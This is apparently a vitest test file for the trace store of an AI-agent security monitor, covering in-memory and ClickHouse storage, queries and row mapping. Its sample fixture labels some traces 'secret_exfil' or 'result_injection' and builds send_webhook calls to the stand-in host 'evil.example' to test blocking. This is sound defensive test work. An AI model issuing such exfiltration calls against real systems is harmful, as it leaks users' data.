import { describe, expect, it } from 'vitest';
import { CREATE_TABLE_SQL, ClickHouseStore, MemoryStore, NAMED_QUERIES, createStore, formatDateTime64, pingClickHouse, rowToTrace, traceToRow, type Trace } from '../src/index.js';
import { T0, call, resetCounter, trace } from './helpers.js';

function sample(): Trace[] {
  resetCounter();
  const out: Trace[] = [];
  for (let i = 0; i < 30; i++) {
    const attack = i % 3 === 0;
    out.push(
      trace({
        family: attack ? (i % 2 ? 'secret_exfil' : 'result_injection') : 'benign',
        label: attack ? 'attack' : 'benign',
        decision: attack ? (i % 9 === 0 ? 'allow' : 'block') : 'allow',
        breached: attack && i % 9 === 0,
        blockedBy: attack && i % 9 !== 0 ? 'rl_builtin_destination' : undefined,
        latencyMs: 0.1 * (i + 1),
        attemptedCall: call('send_webhook', { url: `https://${attack ? 'evil.example' : 'hooks.acme.example'}/x/${i}` }),
      }),
    );
  }
  return out;
}

describe('MemoryStore', () => {
  it('inserts, counts, filters, aggregates and resets — measuring every query', async () => {
    const store = new MemoryStore();
    await store.init();
    const traces = sample();
    const ins = await store.insertTraces(traces);
    expect(ins.inserted).toBe(30);
    expect(ins.ms).toBeGreaterThanOrEqual(0);
    expect(await store.count()).toBe(30);
    expect(store.lastQueryMs).not.toBeNull();
    expect(store.queryLog.map((q) => q.name)).toContain('insertTraces');

    const corpus = await store.corpus();
    expect(corpus.traces.length).toBe(30);
    expect(corpus.traces[0]!.ts).toBeLessThan(corpus.traces[29]!.ts);
    expect((await store.corpus(5)).traces.length).toBe(5);

    const recent = await store.recent(3, { label: 'attack' });
    expect(recent.traces.length).toBe(3);
    expect(recent.traces.every((t) => t.label === 'attack')).toBe(true);
    expect(recent.traces[0]!.ts).toBeGreaterThan(recent.traces[1]!.ts);
    expect((await store.recent(10, { family: 'secret_exfil', breached: true })).traces.every((t) => t.family === 'secret_exfil' && t.breached)).toBe(true);

    const fam = await store.countByFamily();
    const benign = fam.find((f) => f.family === 'benign')!;
    expect(benign.total).toBe(20);
    expect(benign.blocked).toBe(0);
    expect(fam.filter((f) => f.label === 'attack').reduce((a, f) => a + f.total, 0)).toBe(10);
    expect(fam.reduce((a, f) => a + f.breached, 0)).toBe(traces.filter((t) => t.breached).length);

    const tl = await store.timeline(10, T0);
    expect(tl.length).toBe(4); // ts = T0+1s..T0+30s → buckets T0, +10s, +20s, +30s
    expect(tl.reduce((a, b) => a + b.attacks + b.benign, 0)).toBe(30);
    expect(tl[0]!.bucket % 10000).toBe(0);
    expect((await store.timeline(10, T0 + 25_000)).reduce((a, b) => a + b.attacks + b.benign, 0)).toBe(6);

    const lat = await store.latency();
    expect(lat.count).toBe(30);
    expect(lat.max).toBeCloseTo(3.0, 5);
    expect(lat.p50).toBeGreaterThan(0);
    expect(lat.p95).toBeGreaterThanOrEqual(lat.p50);

    for (const name of NAMED_QUERIES) {
      const r = await store.runNamedQuery(name, { since: T0 });
      expect(r.name).toBe(name);
      expect(r.sql).toContain('immune.traces');
      expect(r.ms).toBeGreaterThanOrEqual(0);
      expect(Array.isArray(r.rows)).toBe(true);
    }
    const dest = await store.runNamedQuery('top_destinations');
    expect(dest.rows[0]).toMatchObject({ host: 'hooks.acme.example', calls: 20, allowed: 20, blocked: 0 });
    expect(dest.rows[1]).toMatchObject({ host: 'evil.example', calls: 10 });
    const br = await store.runNamedQuery('breaches');
    expect(br.rows.length).toBe(traces.filter((t) => t.breached).length);

    expect((await store.status()).kind).toBe('memory');
    await store.reset();
    expect(await store.count()).toBe(0);
    await store.close();
  });

  it('caps rows at maxRows (oldest dropped)', async () => {
    const store = new MemoryStore({ maxRows: 5 });
    await store.insertTraces(sample());
    expect(await store.count()).toBe(5);
  });
});

describe('createStore', () => {
  it('falls back to memory when ClickHouse is unreachable or forced', async () => {
    const forced = await createStore({ force: 'memory' });
    expect(forced.kind).toBe('memory');
    expect(forced.store.kind).toBe('memory');
    const down = await createStore({ url: 'http://127.0.0.1:1', pingTimeoutMs: 300 });
    expect(down.kind).toBe('memory');
    expect(down.detail).toContain('not reachable');
    const ping = await pingClickHouse('http://127.0.0.1:1', 300);
    expect(ping.ok).toBe(false);
  });
});

describe('ClickHouse row mapping', () => {
  it('round-trips a trace through the row shape', () => {
    const all = sample();
    const t = all[1]; // benign
    const row = traceToRow(t!);
    expect(row.ts).toBe(formatDateTime64(t!.ts));
    expect(row.breached).toBe(0);
    expect(traceToRow(all[0]!).breached).toBe(1);
    expect(traceToRow(all[0]!).blocked_by).toBe('');
    expect(typeof row.attempted_call).toBe('string');
    const back = rowToTrace({ ...row, ts: t!.ts });
    expect(back).toEqual(t);
    expect(formatDateTime64(0)).toBe('1970-01-01 00:00:00.000');
    expect(CREATE_TABLE_SQL).toContain('ORDER BY (ts, id)');
  });
});

// Opt-in live test: IMMUNE_TEST_CLICKHOUSE=1 pnpm --filter @immune/core test
describe.skipIf(process.env.IMMUNE_TEST_CLICKHOUSE !== '1')('ClickHouseStore (live)', () => {
  it('init + batched insert + filtered reads + named queries (table may be shared with a running app)', async () => {
    const store = new ClickHouseStore({ batchSize: 7 });
    await store.init();
    const sid = `vitest-live-${Date.now()}`;
    const before = await store.count();
    const traces = sample().map((t) => ({ ...t, id: `tr_vitest_${t.id}`, sessionId: sid, variant: 'vitest-live' }));
    try {
      const ins = await store.insertTraces(traces);
      expect(ins.inserted).toBe(30);
      expect(ins.ms).toBeGreaterThan(0);
      expect(await store.count()).toBe(before + 30);
      const attacks = await store.recent(50, { sessionId: sid, label: 'attack' });
      expect(attacks.traces.length).toBe(10);
      expect(attacks.traces.every((t) => t.label === 'attack' && t.sessionId === sid)).toBe(true);
      const mine = await store.recent(100, { sessionId: sid });
      expect(mine.traces.length).toBe(30);
      expect(mine.traces[0]!.ts).toBeGreaterThan(mine.traces[29]!.ts);
      expect(mine.traces.find((t) => t.id === traces[0]!.id)).toEqual(traces[0]);
      const corpus = await store.corpus(50);
      expect(corpus.traces.length).toBeLessThanOrEqual(50);
      if (corpus.traces.length > 1) expect(corpus.traces[0]!.ts).toBeLessThanOrEqual(corpus.traces[corpus.traces.length - 1]!.ts);
      for (const name of NAMED_QUERIES) {
        const r = await store.runNamedQuery(name);
        expect(Array.isArray(r.rows)).toBe(true);
        expect(r.ms).toBeGreaterThan(0);
      }
      expect((await store.countByFamily()).reduce((a, f) => a + f.total, 0)).toBe(before + 30);
      expect((await store.latency()).count).toBe(before + 30);
      expect((await store.status()).connected).toBe(true);
    } finally {
      await store.rawCommand('ALTER TABLE immune.traces DELETE WHERE session_id = {sid:String}', { sid });
      expect(await store.count()).toBe(before);
      await store.close();
    }
  });
});
